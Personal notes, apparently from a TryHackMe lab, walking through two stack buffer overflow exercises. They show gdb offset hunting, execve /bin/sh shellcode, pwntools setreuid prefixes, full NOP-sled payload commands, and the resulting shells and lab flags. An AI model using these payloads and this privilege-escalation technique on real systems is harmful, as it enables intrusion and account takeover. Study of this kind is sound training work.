@@ -433,3 +433,439 @@ and "show warranty" for details.
 This GDB was configured as "x86_64-redhat-linux-gnu".
 Type "show configuration" for configuration details.
 For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from buffer-overflow...(no debugging symbols found)...done.
+(gdb) run $(python2 -c "print 'A' * 158")
+Starting program: /home/user1/overflow-3/buffer-overflow $(python2 -c "print 'A' * 158")
+Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64
+Here's a program that echo's out your input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000414141414141 in ?? () 
+
+158-6 = 152
+
+with 153 will be overwriting and with 159 will be passed
+
+(gdb) run $(python2 -c "print 'A' * 153")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-3/buffer-overflow $(python2 -c "print 'A' * 153")
+Here's a program that echo's out your input
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000400041 in ?? ()
+
+cz x41 in hexadecimal to ASCII is A (try using it)
+https://www.binaryhexconverter.com/hex-to-ascii-text-converter
+
+With a 158 bytes length payload, we are overwritting 6 bytes of the return address. As a result, the offset will be 152 bytes.
+
+shellcode (40 bytes) that works here: https://www.arsouyes.org/blog/2019/54_Shellcode/
+
+>>> shellcode = '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'
+>>> len(shellcode)
+40
+
+Return address
+
+The last item we need to complete our payload is the return address of the shell code (6 bytes). Our payload will be like this:
+
+┌───────────────────┬────────────────────┬────────────────────┬────────────────────┐
+│ NOP sled (90)     │  shell code (40)   │  random chars (22) │ Memory address (6) │
+└───────────────────┴────────────────────┴────────────────────┴────────────────────┘
+total length = 90 + 40 + 22 + 6 = 158
+
+or can be using tryhackme shellcode which is len 30 so 90 + 30 + 12 + 6 = 158
+
+anyways
+
+>>> payload = '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6
+>>> len(payload)
+158
+
+(gdb) run $(python2 -c "print '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-3/buffer-overflow $(python2 -c "print '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + 'B'*6")
+Here's a program that echo's out your input
+������������������������������������������������������������������������������������������j;XH1�I�//bin/shIAPH��RWH��j<XH1�����������������������BBBBBB
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000424242424242 in ?? ()
+
+See where NOP sled string is located, and beginning of shellcode. 
+
+(gdb) x/100x 
+Argument required (starting display address).
+(gdb) x/100x $rsp-200
+0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff
+0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff
+0x7fffffffe248: 0xffffe649      0x00007fff      0x90909090      0x90909090
+0x7fffffffe258: 0x90909090      0x90909090      0x90909090      0x90909090
+0x7fffffffe268: 0x90909090      0x90909090      0x90909090      0x90909090
+0x7fffffffe278: 0x90909090      0x90909090      0x90909090      0x90909090
+0x7fffffffe288: 0x90909090      0x90909090      0x90909090      0x90909090
+0x7fffffffe298: 0x90909090      0x90909090      0x90909090      0x90909090
+0x7fffffffe2a8: 0x3b6a9090      0xd2314858      0x2f2fb849      0x2f6e6962
+0x7fffffffe2b8: 0xc1496873      0x504108e8      0x52e78948      0xe6894857
+0x7fffffffe2c8: 0x3c6a050f      0xff314858      0x9090050f      0x90909090
+0x7fffffffe2d8: 0x90909090      0x90909090      0x90909090      0x90909090
+0x7fffffffe2e8: 0x42424242      0x00004242      0xffffe3e8      0x00007fff
+0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000
+0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000
+0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002
+0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000
+0x7fffffffe338: 0xc3f0b440      0xc6a53754      0x00400450      0x00000000
+
+0x7fffffffe298: 0x3b6a9090  0xd2314858  0x2f2fb849  0x2f6e6962 <--- shellcode
+
+so before this one will be NOP sled final
+
+0x7fffffffe218: 0x00400450  0x00000000  0xffffe3d0  0x00007fff
+0x7fffffffe228: 0x00400561  0x00000000  0xf7dce8c0  0x00007fff
+0x7fffffffe238: 0xffffe639  0x00007fff  0x90909090  0x90909090 <--- NOP sled
+0x7fffffffe248: 0x90909090  0x90909090  0x90909090  0x90909090
+0x7fffffffe258: 0x90909090  0x90909090  0x90909090  0x90909090
+0x7fffffffe268: 0x90909090  0x90909090  0x90909090  0x90909090
+0x7fffffffe278: 0x90909090  0x90909090  0x90909090  0x90909090
+0x7fffffffe288: 0x90909090  0x90909090  0x90909090  0x90909090
+0x7fffffffe298: 0x3b6a9090  0xd2314858  0x2f2fb849  0x2f6e6962 <--- shellcode
+
+Let’s take any address between the NOP sled and the shellcode (e.g. 0x7fffffffe288). Here is the final payload:
+
+\x88\xe2\xff\xff\xff\x7f
+
+so final payload will be
+
+./buffer-overflow $(python2 -c "print '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + '\x88\xe2\xff\xff\xff\x7f'")
+
+---Type <return> to continue, or q <return> to quit---q
+Quit
+(gdb) quit
+A debugging session is active.
+
+        Inferior 1 [process 6093] will be killed.
+
+Quit anyway? (y or n) y
+[user1@ip-10-10-69-210 overflow-3]$ ./buffer-overflow $(python2 -c "print '\x90'*90 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*22 + '\x88\xe2\xff\xff\xff\x7f'")
+Here's a program that echo's out your input
+������������������������������������������������������������������������������������������j;XH1�I�//bin/shIAPH��RWH��j<XH1����������������������������
+sh-4.2$ whoami
+user1
+sh-4.2$ cat secret.txt
+cat: secret.txt: Permission denied
+
+not work 😢
+
+As you can see above, we are not allowed to access the secret though, because we are not user2.
+
+setreuid
+
+Let’s use pwntools to generate a prefix to our shellcode to run SETREUID:
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/learn]
+└─$ pwn shellcraft -f d amd64.linux.setreuid 1002
+Command 'pwn' not found, but can be installed with:
+sudo apt install python3-pwntools
+Do you want to install it? (N/y)y
+sudo apt install python3-pwntools
+
+[user1@ip-10-10-2-237 ~]$ grep user2 /etc/passwd
+user2:x:1002:1002::/home/user2:/bin/bash
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/learn]
+└─$ pwn shellcraft -f d amd64.linux.setreuid 1002
+[*] Checking for new versions of pwntools
+    To disable this functionality, set the contents of /home/kali/.cache/.pwntools-cache-3.10/update to 'never' (old way).
+    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
+        [update]
+        interval=never
+[*] You have the latest version of Pwntools (4.8.0)
+\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
+
+>>> len('\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05')
+14
+
+Our payload now looks like this:
+
+┌───────────────────┬────────────────────┬────────────────────┬────────────────────┬────────────────────┐
+│ NOP sled (90)     │  setreuid (14)     │ shellcode (40)     │ random chars (8)   │ Memory address (6) │
+└───────────────────┴────────────────────┴────────────────────┴────────────────────┴────────────────────┘
+total length = 90 + 14 + 40 + 8 + 6 = 158
+
+Let’s test: 
+
+[user1@ip-10-10-69-210 overflow-3]$ ./buffer-overflow $(python2 -c "print '\x90'*90 + '\x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*8 + '\x88\xe2\xff\xff\xff\x7f'")
+Here's a program that echo's out your input
+������������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1��������������
+sh-4.2$ whoami
+user2
+sh-4.2$ cat secret.txt
+omgyoudidthissocool!!
+
+it works 😊
+```
+![[Pasted image 20221017184228.png]]
+Use the above method to open a shell and read the contents of the secret.txt file.
+*omgyoudidthissocool!!*
+### Buffer Overflow 2
+Look at the overflow-4 folder. Try to use your newly learnt buffer overflow techniques for this binary file.
+```text
+sh-4.2$ exit
+exit
+[user1@ip-10-10-69-210 overflow-3]$ cd ../overflow-4
+[user1@ip-10-10-69-210 overflow-4]$ ls
+buffer-overflow-2  buffer-overflow-2.c  secret.txt
+[user1@ip-10-10-69-210 overflow-4]$ cat buffer-overflow-2.c
+#include <stdio.h>
+#include <stdlib.h>
+
+void concat_arg(char *string)
+{
+    char buffer[154] = "doggo";
+    strcat(buffer, string);
+    printf("new word is %s\n", buffer);
+    return 0;
+}
+
+int main(int argc, char **argv)
+{
+    concat_arg(argv[1]);
+}
+
+[user1@ip-10-10-69-210 overflow-4]$ cat ../overflow-3/buffer-overflow.c
+#include <stdio.h>
+#include <stdlib.h>
+
+void copy_arg(char *string)
+{
+    char buffer[140];
+    strcpy(buffer, string);
+    printf("%s\n", buffer);
+    return 0;
+}
+
+int main(int argc, char **argv)
+{
+    printf("Here's a program that echo's out your input\n");
+    copy_arg(argv[1]);
+}
+
+let's do it again!
+yep it's quite similar
+
+[user1@ip-10-10-2-237 overflow-4]$ ls
+buffer-overflow-2  buffer-overflow-2.c  secret.txt
+[user1@ip-10-10-2-237 overflow-4]$ ./buffer-overflow-2 hi
+new word is doggohi
+[user1@ip-10-10-2-237 overflow-4]$ ./buffer-overflow-2 OFF
+new word is doggoOFF
+
+but this time doggo is add it so need to remove it
+
+[user1@ip-10-10-2-237 overflow-4]$ ./buffer-overflow-2 $(python2 -c "print 'A' * 155")
+new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+
+offset
+
+The buffer is 154 bytes, but the string doggo (5 characters) is added. So we should begin to test from 154-5. Let’s start with 8 more bytes: 
+
+[user1@ip-10-10-2-237 overflow-4]$ gdb buffer-overflow-2
+GNU gdb (GDB) Red Hat Enterprise Linux 8.0.1-30.amzn2.0.3
+Copyright (C) 2017 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-redhat-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from buffer-overflow-2...(no debugging symbols found)...done.
+(gdb) run $(python2 -c "print 'A' * 154-5+8")
+Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python2 -c "print 'A' * 154-5+8")
+Traceback (most recent call last):
+  File "<string>", line 1, in <module>
+TypeError: unsupported operand type(s) for -: 'str' and 'int'
+Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00007ffff7abfe67 in __strcat_sse2_unaligned () from /lib64/libc.so.6
+
+Not enough to overwrite the return address. Let’s add 8 more bytes: 
+
+(gdb) run $(python2 -c "print 'A' * (154-5+8*2)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python2 -c "print 'A' * (154-5+8*2)")
+new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000004141 in ?? ()
+
+Good, we start seing 2 times ‘A’ overwritting the return address. We need 6 in total, so we need 4 more: 
+
+(gdb) run $(python2 -c "print 'A' * (154-5+8*2+4)")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python2 -c "print 'A' * (154-5+8*2+4)")
+new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000414141414141 in ?? ()
+
+The offset is 169 (154-5+8*2+4). 
+
+so here 169 -6 = 163-5 = 158
+
+Shellcode
+
+We’ll use the same shellcode (158 bytes) as previously, with the SETREUID. This time, we need to target user3 (ID is 1003), to be able to read secret.txt:
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/learn]
+└─$ ssh user1@10.10.2.237                            
+user1@10.10.2.237's password: 
+Last login: Tue Oct 18 00:33:01 2022 from ip-10-13-51-212.eu-west-1.compute.internal
+
+       __|  __|_  )
+       _|  (     /   Amazon Linux 2 AMI
+      ___|\___|___|
+
+https://aws.amazon.com/amazon-linux-2/
+[user1@ip-10-10-2-237 ~]$ grep user3 /etc/passwd
+user3:x:1003:1003::/home/user3:/bin/bash
+```
+```text
+┌──(kali㉿kali)-[~/bufferoverflow/learn]
+└─$ pwn shellcraft -f d amd64.linux.setreuid 1003
+\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
+
+>>> shellcode = '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05' + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05'
+>>> len(shellcode)
+54
+
+Return address
+
+Now, let’s have a look at our payload. It should look like this:
+
+┌───────────────────┬────────────────────┬────────────────────┬────────────────────┐
+│ NOP sled (90)     │ shellcode (54)     │ random chars (19)  │ Memory address (6) │
+└───────────────────┴────────────────────┴────────────────────┴────────────────────┘
+total length = 90 + 54 + 19 + 6 = 169
+
+>>> payload = 'A'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6
+>>> len(payload)
+169
+
+now NOP sled
+
+[user1@ip-10-10-2-237 overflow-4]$ gdb buffer-overflow-2
+GNU gdb (GDB) Red Hat Enterprise Linux 8.0.1-30.amzn2.0.3
+Copyright (C) 2017 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-redhat-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from buffer-overflow-2...(no debugging symbols found)...done.
+(gdb) run $(python2 -c "print 'A'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6")
+Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python2 -c "print 'A'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6")
+Missing separate debuginfos, use: debuginfo-install glibc-2.26-32.amzn2.0.1.x86_64
+new word is doggoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1�BBBBBBBBBBBBBBBBBBBCCCCCC
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000434343434343 in ?? ()
+(gdb) x/100x $rsp-200
+0x7fffffffe218: 0x004005a9      0x00000000      0xf7ffa268      0x00007fff
+0x7fffffffe228: 0xffffe63e      0x00007fff      0x67676f64      0x4141416f
+0x7fffffffe238: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe248: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe258: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe268: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe278: 0x41414141      0x41414141      0x41414141      0x41414141
+0x7fffffffe288: 0x41414141      0x31414141      0xebbf66ff      0x58716a03
+0x7fffffffe298: 0x0ffe8948      0x583b6a05      0x49d23148      0x622f2fb8
+0x7fffffffe2a8: 0x732f6e69      0xe8c14968      0x48504108      0x5752e789
+0x7fffffffe2b8: 0x0fe68948      0x583c6a05      0x0fff3148      0x42424205
+0x7fffffffe2c8: 0x42424242      0x42424242      0x42424242      0x42424242
+0x7fffffffe2d8: 0x43434343      0x00004343      0xffffe3d8      0x00007fff
+0x7fffffffe2e8: 0x00000000      0x00000002      0x004005e0      0x00000000
+0x7fffffffe2f8: 0xf7a4302a      0x00007fff      0x00000000      0x00000000
+0x7fffffffe308: 0xffffe3d8      0x00007fff      0x00040000      0x00000002
+0x7fffffffe318: 0x004005ac      0x00000000      0x00000000      0x00000000
+0x7fffffffe328: 0x1e3de574      0x1b8c4ce3      0x00400450      0x00000000
+---Type <return> to continue, or q <return> to quit---q
+Quit
+(gdb) run $(python2 -c "print '\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6")
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user1/overflow-4/buffer-overflow-2 $(python2 -c "print '\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'B'*19 + 'C'*6")
+new word is doggo������������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1�BBBBBBBBBBBBBBBBBBBCCCCCC
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000434343434343 in ?? ()
+(gdb) x/100x $rsp-200
+0x7fffffffe218: 0x004005a9      0x00000000      0xf7ffa268      0x00007fff
+0x7fffffffe228: 0xffffe63e      0x00007fff      0x67676f64      0x9090906f
+0x7fffffffe238: 0x90909090      0x90909090      0x90909090      0x90909090
+0x7fffffffe248: 0x90909090      0x90909090      0x90909090      0x90909090
+0x7fffffffe258: 0x90909090      0x90909090      0x90909090      0x90909090
+0x7fffffffe268: 0x90909090      0x90909090      0x90909090      0x90909090
+0x7fffffffe278: 0x90909090      0x90909090      0x90909090      0x90909090
+0x7fffffffe288: 0x90909090      0x31909090      0xebbf66ff      0x58716a03
+0x7fffffffe298: 0x0ffe8948      0x583b6a05      0x49d23148      0x622f2fb8
+0x7fffffffe2a8: 0x732f6e69      0xe8c14968      0x48504108      0x5752e789
+0x7fffffffe2b8: 0x0fe68948      0x583c6a05      0x0fff3148      0x42424205
+0x7fffffffe2c8: 0x42424242      0x42424242      0x42424242      0x42424242
+0x7fffffffe2d8: 0x43434343      0x00004343      0xffffe3d8      0x00007fff
+0x7fffffffe2e8: 0x00000000      0x00000002      0x004005e0      0x00000000
+0x7fffffffe2f8: 0xf7a4302a      0x00007fff      0x00000000      0x00000000
+0x7fffffffe308: 0xffffe3d8      0x00007fff      0x00040000      0x00000002
+0x7fffffffe318: 0x004005ac      0x00000000      0x00000000      0x00000000
+0x7fffffffe328: 0xde9fddd9      0xd0cf00c1      0x00400450      0x00000000
+
+0x7fffffffe288: 0x90909090      0x31909090      0xebbf66ff      0x58716a03 --> shellcode
+
+yep Let’s take 0x7fffffffe278 as return address (between future NOP sled and beginning of shell code). 
+
+Now, memory address: (revert taking 78 e2 ff ff ff ff 7f then adding \x to get hex)
+
+\x78\xe2\xff\xff\xff\x7f
+
+[user1@ip-10-10-2-237 overflow-4]$ ./buffer-overflow-2 $(python2 -c "print '\x90'*90 + '\x31\xff\x66\xbf\xeb\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + '\x90'*19 + '\x78\xe2\xff\xff\xff\x7f'")
+new word is doggo������������������������������������������������������������������������������������������1�f��jqXH��j;XH1�I�//bin/shI�APH��RWH��j<XH1��������������������x����
+sh-4.2$ whoami
+user3
+sh-4.2$ cat secret.txt
+wowanothertime!!
+
+yep finally do it!
+```
+Use the same method to read the contents of the secret file!
+*wowanothertime!!*
+
+## Notes / Lessons Learned
+[[Phishing Emails 4]]
+
